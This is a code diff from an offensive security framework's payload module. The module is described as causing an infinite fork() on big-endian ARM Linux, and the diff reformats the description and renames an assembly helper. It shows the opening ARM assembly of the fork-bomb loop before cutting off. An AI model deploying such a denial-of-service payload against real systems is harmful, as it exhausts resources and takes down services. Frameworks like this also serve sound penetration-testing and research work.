@@ -15,23 +15,23 @@ class HatSploitPayload(Payload, Linux):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload is intended to cause infinite fork() on Linux "
-                "with ARM big-endian architecture."
-            ),
+            'Description': """
+                This payload is intended to cause infinite fork() on Linux
+                with ARM big-endian architecture.
+            """,
             'Arch': ARCH_ARMBE,
             'Platform': OS_LINUX,
             'Type': ONE_SIDE,
         })
 
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             """
             start:
                 add r1, pc, #1
                 bx r1
             """
-        ) + self.assemble(
+        ) + self.__asm__(
             """
             loop:
                 eors r7, r7
